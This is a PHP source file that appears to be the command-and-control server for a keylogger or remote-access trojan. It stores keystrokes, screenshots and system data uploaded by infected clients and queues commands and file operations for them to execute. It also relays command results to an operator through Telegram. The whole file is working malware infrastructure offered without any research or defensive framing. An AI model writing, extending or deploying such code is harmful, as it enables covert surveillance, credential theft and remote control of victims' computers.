<?php
require_once 'config.php';
require_once 'crypto.php';
require_once 'utils.php';
require_once 'telegram_handler.php';
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json; charset=utf-8');

class ApiHandler
{
    private $pdo;
    private $crypto;

    public function __construct()
    {
        try {
            $this->crypto = new Crypto();
            $this->connect_db();
            $this->ensure_directories();
        } catch (Exception $e) {
            $this->log_error("Constructor Error: " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['error' => 'Initialization failed'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    }

    private function connect_db()
    {
        try {
            $this->pdo = new PDO(
                "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
                Config::$DB_USER,
                Config::$DB_PASS,
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
            );
        } catch (PDOException $e) {
            $this->log_error("DB Connection Failed: " . $e->getMessage());
            error_log("Database Error: " . $e->getMessage()); // خطای جدید
            http_response_code(500);
            echo json_encode(['error' => 'Database connection failed'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    }

    private function ensure_directories()
    {
        foreach ([Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR] as $dir) {
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
        }
    }


    public function handle_request()
    {
        $raw = file_get_contents('php://input');
        $json = json_decode($raw, true);

        if (isset($json['update_id'])) {
            file_put_contents(Config::$WEBHOOK_LOG, date('c') . " TELEGRAM: $raw\n", FILE_APPEND);
            try {
                TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $json);
            } catch (Exception $e) {
                $this->log_error("Error in TelegramHandler: " . $e->getMessage());
                http_response_code(500);
                echo json_encode(['error' => 'TelegramHandler error'], JSON_UNESCAPED_UNICODE);
            }
            return;
        }
        $action = $_POST['action'] ?? $_GET['action'] ?? '';
        $this->log_webhook();


        if ($action === 'telegram_webhook') {
            $update = json_decode(file_get_contents('php://input'), true);
            TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $update);
            return;
        }

        if (!$this->verify_token()) {
            http_response_code(403);
            echo json_encode(['error' => 'Invalid token'], JSON_UNESCAPED_UNICODE);
            return;
        }

        switch ($action) {
            case 'upload_data':
                $this->handle_upload();
                break;
            case 'get_commands':
                $this->handle_get_commands();
                break;
            case 'command_response':
                $this->handle_command_response();
                break;
            case 'file_manager':
                $this->handle_file_manager();
                break;
            default:
                http_response_code(400);
                echo json_encode(['error' => 'Invalid action'], JSON_UNESCAPED_UNICODE);
        }
    }

    private function verify_token()
    {
        return isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN;
    }

    private function log_webhook()
    {
        $data = [
            'time' => date('Y-m-d H:i:s'),
            'method' => $_SERVER['REQUEST_METHOD'],
            'post' => $_POST,
            'get' => $_GET,
            'input' => file_get_contents('php://input')
        ];
        file_put_contents(Config::$WEBHOOK_LOG, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }

    private function handle_upload()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');
        $system_info = json_decode($this->crypto->decrypt($_POST['system_info'] ?? ''), true);
        $screenshot = $_FILES['screenshot'] ?? null;

        $screenshot_path = null;
        if ($screenshot && $screenshot['error'] === UPLOAD_ERR_OK) {
            $screenshot_path = Config::$SCREENSHOT_DIR . time() . '_' . $client_id . '.png';
            move_uploaded_file($screenshot['tmp_name'], $screenshot_path);
        }

        $this->pdo->prepare("
            INSERT INTO client_data (client_id, keystrokes, screenshot_path, system_info, received_at)
            VALUES (?, ?, ?, ?, NOW())
        ")->execute([$client_id, $keystrokes, $screenshot_path, json_encode($system_info)]);

        $this->pdo->prepare("
            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
            VALUES (?, NOW(), ?, ?)
            ON DUPLICATE KEY UPDATE last_seen = NOW(), ip_address = ?, last_ip = ?
        ")->execute([$client_id, $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown']);

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_get_commands()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');

        // افزودن بخش به‌روزرسانی وضعیت آنلاین کاربر
        $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $this->pdo->prepare("
            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
            VALUES (?, NOW(), ?, ?)
            ON DUPLICATE KEY UPDATE 
                last_seen = NOW(), 
                ip_address = VALUES(ip_address),
                last_ip = VALUES(last_ip)
        ")->execute([$client_id, $ip_address, $ip_address]);

        // بقیه کد موجود
        $stmt = $this->pdo->prepare("
        SELECT id, command FROM commands
        WHERE client_id = ? AND status = 'pending'
    ");
        $stmt->execute([$client_id]);
        $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);

        $this->pdo->prepare("UPDATE commands SET status = 'sent' WHERE client_id = ? AND status = 'pending'")
            ->execute([$client_id]);

        echo json_encode(['commands' => $commands], JSON_UNESCAPED_UNICODE);
    }
    private function handle_command_response()
    {
        $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
        $result = json_decode($this->crypto->decrypt($_POST['result'] ?? ''), true);

        $this->pdo->prepare("
            UPDATE commands SET response = ?, status = 'completed', completed_at = NOW()
            WHERE id = ?
        ")->execute([json_encode($result), $command_id]);

        $chat_id = Utils::get_admin_chat_id($this->pdo);
        if ($chat_id) {
            TelegramHandler::send_telegram_message(
                $chat_id,
                "Command #$command_id executed:\n" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT),
                ['parse_mode' => 'HTML']
            );
        }

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_file_manager()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $params = json_decode($this->crypto->decrypt($_POST['params'] ?? ''), true);
        $command = [
            'type' => 'file_operation',
            'params' => $params
        ];

        $stmt = $this->pdo->prepare("
            INSERT INTO commands (client_id, command, status, created_at)
            VALUES (?, ?, 'pending', NOW())
        ");
        $stmt->execute([$client_id, $this->crypto->encrypt(json_encode($command))]);

        echo json_encode(['status' => 'success', 'command_id' => $this->pdo->lastInsertId()], JSON_UNESCAPED_UNICODE);
    }

    private function log_error($message)
    {
        Utils::log_error($message);
    }
}

$api = new ApiHandler();
$api->handle_request();
